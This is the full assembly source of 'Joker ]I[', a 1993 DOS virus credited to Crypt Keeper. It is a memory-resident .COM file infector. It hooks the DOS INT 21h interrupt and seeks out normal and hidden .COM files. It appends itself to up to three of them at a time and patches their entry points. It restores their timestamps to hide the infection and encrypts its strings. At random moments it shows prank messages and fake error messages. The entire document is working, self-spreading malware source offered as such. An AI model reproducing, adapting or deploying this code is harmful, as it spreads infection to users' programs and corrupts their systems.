;****************************************************************************
;*                                 Joker ]I[                                *
;*                          (C)1993 by Crypt Keeper                         *
;****************************************************************************

;Parasitic Resident .COM infector
;Activation Criteria : Random based on system clock

;Formatted for standard assemblers.

CODE    SEGMENT
    ASSUME CS:CODE,DS:CODE,ES:CODE,SS:CODE
    
    ORG 100h                       ;.COM file
    
TOPMARK EQU $                      ;Top of viral code

;Equates --------------------------------------------------------------------

VLENGTH EQU BOTMARK-TOPMARK        ;Length of viral code
AMTRES  EQU 1000h                  ;Paragraphs to remain resident
MAXINF  EQU 3                      ;Maximum number of files to infect

;----------------------------------------------------------------------------

    CALL GETDELTA
GETDELTA:
    POP BP
    SUB BP,OFFSET(GETDELTA)        ;Calculate delta offset

START   PROC NEAR                      ;Startup routine
    LEA BX,[BP+OFFSET(MSG1)]
    MOV AH,BYTE PTR [BX]           ;Get 1st byte of message one
    CMP AH,'Y'                     ;Already decrypted?
    JE SKIPDEC                     ;If so, skip decryption
    
    CALL TEXTENC                   ;If not, encrypt text

SKIPDEC:
    MOV AH,2Ch                     ;Get time
    INT 21h

    CMP DL,DH                      ;Seconds = Hundredths?
    JE TRIGGER                     ;If so, trigger

    JMP SHORT CHKRES               ;If not, check if resident

TRIGGER:
    INC DL                         ;0..99 --> 1..100
    XOR DH,DH                      ;Make sure DH is clear
    MOV AX,DX                      ;AX = Word to divide by
    MOV DL,10                      ;10 messages in all
    DIV DL                         ;Find random number from 1 to 10
    
    CMP AL,1
    JE M1
    CMP AL,2
    JE M2
    CMP AL,3
    JE M3
    CMP AL,4
    JE M4
    CMP AL,5
    JE M5
    CMP AL,6
    JE M6
    CMP AL,7
    JE M7
    CMP AL,8
    JE M8
    CMP AL,9
    JE M9
    CMP AL,10
    JE M10                         ;Check for all numbers

    JMP SHORT START                ;If none match, get another number
    
M1: LEA DX,[BP+OFFSET(MSG1)]
    JMP SHORT DISPLAY
M2: LEA DX,[BP+OFFSET(MSG2)]
    JMP SHORT DISPLAY
M3: LEA DX,[BP+OFFSET(MSG3)]
    JMP SHORT DISPLAY
M4: LEA DX,[BP+OFFSET(MSG4)]
    JMP SHORT DISPLAY
M5: LEA DX,[BP+OFFSET(MSG5)]
    JMP SHORT DISPLAY
M6: LEA DX,[BP+OFFSET(MSG6)]
    JMP SHORT DISPLAY
M7: LEA DX,[BP+OFFSET(MSG7)]
    JMP SHORT DISPLAY
M8: LEA DX,[BP+OFFSET(MSG8)]
    JMP SHORT DISPLAY
M9: LEA DX,[BP+OFFSET(MSG9)]
    JMP SHORT DISPLAY
M10:    LEA DX,[BP+OFFSET(MSG10)]

DISPLAY:
    MOV AH,9                       ;Print string
    INT 21h
    
    LEA DX,[BP+OFFSET(CRLF)]       ;Carriage return and line feed
    MOV AH,9                       ;Print string
    INT 21h

    MOV AX,4C00h                   ;Terminate program
    INT 21h

CHKRES: CALL GETPARA                   ;Get paragraphs of RAM in machine
    SUB AX,AMTRES                  ;Get segment where virus should be
    MOV BX,OFFSET(ENDTAG)          ;Offset of ID

    PUSH AX
    POP ES
    MOV DX,ES:[BX]                 ;Get byte at ID location in virus seg
    PUSH CS
    POP ES                         ;Reset ES

    CMP DX,CS:[BP+OFFSET(ENDTAG)]  ;Already resident?
    JNE INSTALL                    ;If not, install

SPAWN:  LEA SI,[BP+OFFSET(SAVBYT)]     ;Offset of saved bytes
    MOV DI,100h
    MOV CX,BCLEN                   ;Length of branch code to replace

    REP MOVSB                      ;Replace the branch code

    MOV AX,100h
    PUSH AX
    RET                            ;Jump to original program

INSTALL:
    MOV AX,3521h                   ;Get INT 21h vector
    INT 21h
    
    MOV CS:[BP+OFFSET(I21VECO)],BX
    MOV CS:[BP+OFFSET(I21VECS)],ES ;INT 21h vectors

    CALL GETPARA
                                   ;Get paragraphs in machine
    SUB AX,AMTRES                  ;Amount to remain resident
    PUSH AX                        ;Save segment of code

    PUSH AX
    POP ES                         ;Destination segment
    PUSH CS
    POP DS                         ;Source segment
    MOV SI,BP                      ;Delta offset=start of viral code
    ADD SI,100h
    MOV DI,100h                    ;Put viral code at 100h in new seg
    MOV CX,VLENGTH                 ;Length of viral code

MVIR:   MOVSB                          ;Move byte
    LOOP MVIR                      ;Loop until CX=0

    XOR SI,SI                      ;Copy PSP
    XOR DI,DI
    MOV CX,100h                    ;256 bytes

MPSP:   MOVSB                          ;Move byte
    LOOP MPSP                      ;Loop until CX=0

    POP DS                         ;Segment of interrupt handler
    MOV DX,OFFSET(INTVEC)          ;Offset of interrupt handler
    
    MOV AX,2521h                   ;Set INT 21h vector
    INT 21h
    
    PUSH CS
    POP ES
    PUSH CS
    POP DS                         ;Reset all the segments
    
    JMP SHORT SPAWN                ;Run original program
START   ENDP

;----------------------------------------------------------------------------

FUNCTION PROC NEAR                     ;Calls the original INT 21h vector
    PUSHF
    CALL DWORD PTR CS:I21VECO      ;Simulate INT to original handler
    RET                            ;Return to caller
FUNCTION ENDP

;----------------------------------------------------------------------------

  ;This is the branch code.  This is overwritten over the first few bytes
  ;of target files on infection.  The equates are for determining size.

BTOP    EQU $                      ;Top of branch code

BRANCH: XCHG BP,BP                     ;Infection ID (pretty unique, eh..)
    DB  0BBh                   ;MOV BX,
VOFFSET DW  0                      ;The virus offset
    ADD BX,100h
    PUSH BX
    RET                            ;Jump to virus code

BBOT    EQU $                      ;Bottom of branch code
BCLEN   EQU BBOT-BTOP              ;Length of branch code

;----------------------------------------------------------------------------

  ;This code encrypts/decrypts the text and data with a NOT instruction.

TEXTENC PROC NEAR                      ;Text encryption procedure
    LEA SI,[BP+OFFSET(DATA)]       ;Offset of data strings
    MOV CX,DATALEN                 ;Length of data

DENC:   NOT BYTE PTR [SI]
    INC SI                         ;Encrypt/Decrypt byte
    LOOP DENC                      ;Loop until CX=0

    RET                            ;Return to caller
TEXTENC ENDP

;----------------------------------------------------------------------------

  ;This procedure finds the total K of memory in the machine according to
  ;INT 12h

GETPARA PROC NEAR                      ;Finds number of paragraphs in machine
    INT 12h                        ;Get K in machine

    MOV CX,1024                    ;1024 bytes in a K
    MUL CX                         ;Multiply AX by CX

    MOV CX,16                      ;16 bytes in a segment
    DIV CX                         ;Divide AX and DX by CX

    RET                            ;Return to caller
GETPARA ENDP

;Data and Messages ----------------------------------------------------------

DATATOP EQU $                      ;Top of data
DATA:

;Here are all the silly messages
  MSG1  DB  'You have the Joker ]I[ virus by Crypt Keeper  [Joker 3]$'
  MSG2  DB  'Please insert tractor-feed toilet paper into printer$'
  MSG3  DB  'Impotence error causing erection at port adress 3E2 IRQ 5$'
  MSG4  DB  'This program requires Microsoft Windows.$'
  MSG5  DB  'Computer hungry : Insert 5-1/4 inch HAMBURGER in drive A:$'
  MSG6  DB  'Missing Light Magenta/Olive ribbon in printer.$'
  MSG7  DB  'Not enough memory.$'
  MSG8  DB  'Packed file corrupt.$'
  MSG9  DB  'Bad command or file name$'
  MSG10 DB  'Bad or missing command interpreter.$'

CRLF    DB  13,10,'$'              ;Carriage return and line feed
SSPEC   DB  '*.COM',0              ;Search spec

DATABOT EQU $
DATALEN EQU DATABOT-DATATOP        ;Length of readable data

OLDATTR DW  0

I21VECO DW  0
I21VECS DW  0                      ;Int 21h vector

SAVBYT  DB  0CDh
    DB  20h                    ;For return to DOS on original file
    DB  BCLEN-2 DUP ('+')

OLDPSP  DW  0                      ;Old PSP
OLDDTAS DW  0
OLDDTAO DW  0                      ;Old DTA

CHKBUF  DW  0                      ;Buffer for check word
OLDTIME DW  0
OLDDATE DW  0                      ;Old time and date

;----------------------------------------------------------------------------

  ;This is the full interrupt handler for INT 21h.  It contains all the
  ;infection and search code, and is based on the handler from The Fly.

INTVEC  PROC NEAR                      ;Int 21h handler
    NOP

    CMP AH,13h                     ;Delete file w/FCB?
    JE VTRIGGER

    CMP AH,0Fh                     ;Open file w/FCB?
    JE VTRIGGER

    CMP AH,36h                     ;Get disk free space?
    JE VTRIGGER

    CMP AH,3Dh                     ;Open file with handle?
    JE VTRIGGER

    CMP AH,39h                     ;Create directory?
    JE VTRIGGER

    CMP AX,3306h                   ;Get MsDOS version?
    JE VTRIGGER

    CMP AX,4301h                   ;Set file attributes?
    JE VTRIGGER

    CMP AH,4Ch                     ;End program?
    JE VTRIGGER

    JMP DWORD PTR CS:I21VECO       ;Execute rest of interrupt chain

VTRIGGER:
    PUSH AX
    PUSH BX
    PUSH CX
    PUSH DX
    PUSH DI
    PUSH SI
    PUSH DS
    PUSH ES
    PUSH BP                        ;Save registers

    CLD                            ;Clear direction flag
    PUSH CS
    POP DS
    PUSH DS
    POP ES                         ;Set up segments

    MOV AH,51h                     ;Get PSP adress
    CALL FUNCTION

    MOV OLDPSP,BX                  ;Old program's PSP

    PUSH CS
    POP BX                         ;Segment of new PSP

    MOV AH,50h                     ;Set PSP adress
    CALL FUNCTION

    MOV AH,2Fh                     ;Get disk transfer adress
    CALL FUNCTION

    MOV OLDDTAO,BX
    MOV OLDDTAS,ES                 ;Old disk transfer adress

    PUSH CS
    POP ES                         ;Reset ES

    PUSH CS
    POP DS
    MOV DX,80h                     ;New DTA

    MOV AH,1Ah                     ;Set disk transfer adress
    CALL FUNCTION

    XOR BP,BP                      ;Zero counter

    MOV CX,0002h                   ;Find normal or hidden .COM files
    MOV DX,OFFSET(SSPEC)           ;Search spec
    
    MOV AH,4Eh                     ;File first file
    CALL FUNCTION

    JNC INFECT                     ;Infect if no carry

    JMP NOMORE                     ;If carry, end infection
INFECT: MOV DX,09Eh                    ;Location of name in DTA
    MOV AX,3D02h                   ;Open file for READWRITE access
    CALL FUNCTION

    MOV BX,AX

    MOV CX,2                       ;Read one word
    PUSH CS
    POP DS
    MOV DX,OFFSET(CHKBUF)          ;Check buffer

    MOV AH,3Fh                     ;Read file or device
    CALL FUNCTION

    MOV DX,CS:CHKBUF
    CMP DX,0ED87h                  ;Already infected?
    JNE GO_AHEAD                   ;If not, go ahead and infect

    JMP SHORT ENDINF               ;If so, end infection process

GO_AHEAD:
    CALL ZEROPTR                   ;Zero file pointer

    MOV CX,BCLEN                   ;Length of branch code
    MOV DX,OFFSET(SAVBYT)          ;Offset of saved byte buffer

    MOV AH,3Fh                     ;Read file or device
    CALL FUNCTION

    XOR CX,CX
    XOR DX,DX                      ;Move zero bytes

    MOV AX,4202h                   ;Move from end of file
    CALL FUNCTION

    MOV CS:VOFFSET,AX              ;Set up code offset in branch

    PUSH BX
    PUSH BP
    XOR BP,BP
    CALL TEXTENC                   ;Encrypt text strings
    POP BP
    POP BX

    MOV CX,VLENGTH                 ;Length of virus code
    MOV DX,100h                    ;Offset 100h in segment

    MOV AH,40h                     ;Write file or device
    CALL FUNCTION
    
    PUSH BX
    PUSH BP
    XOR BP,BP
    CALL TEXTENC                   ;Decrypt text strings
    POP BP
    POP BX

    CALL ZEROPTR                   ;Zero file pointer

    MOV CX,BCLEN                   ;Length of branch code
    MOV DX,OFFSET(BRANCH)          ;Write the branch code

    MOV AH,40h                     ;Write file or device
    CALL FUNCTION

ENDINF: MOV CX,CS:[96h]
    MOV DX,CS:[98h]                ;Old file time and date

    MOV AX,5701h                   ;Set file date and time
    CALL FUNCTION

    MOV AH,3Eh                     ;Close file with handle
    CALL FUNCTION

    CMP BP,MAXINF                  ;Max infection reached?
    JE NOMORE                      ;If so, end search

SLOOP1: MOV AH,4Fh                     ;Find next file
    CALL FUNCTION

    JC NOMORE                      ;Carry set means error

    JMP INFECT                     ;Attempt to infect

NOMORE: CLC                            ;Clear carry flag

    PUSH CS
    POP DS                         ;Reset DS

    MOV DX,OLDDTAS
    MOV DS,DX
    MOV DX,OLDDTAO                 ;DS:DX = Old DTA

    MOV AH,1Ah                     ;Set disk transfer adress
    CALL FUNCTION

    PUSH CS
    POP DS

    MOV BX,OLDPSP                  ;Segment of old PSP

    MOV AH,50h                     ;Set PSP adress
    CALL FUNCTION

    POP BP
    POP ES
    POP DS
    POP SI
    POP DI
    POP DX
    POP CX
    POP BX
    POP AX                         ;Restore registers
    
    JMP DWORD PTR CS:I21VECO       ;Execute rest of interrupt chain
ZEROPTR:
    XOR CX,CX
    XOR DX,DX                      ;Move zero bytes

    MOV AX,4200h                   ;Move from beginning of file
    CALL FUNCTION
    RET                            ;Return to caller
INTVEC  ENDP

;----------------------------------------------------------------------------

ENDTAG  DB  'CK'                   ;Resident ID string

BOTMARK EQU $                      ;Bottom of viral code

CODE    ENDS
    END
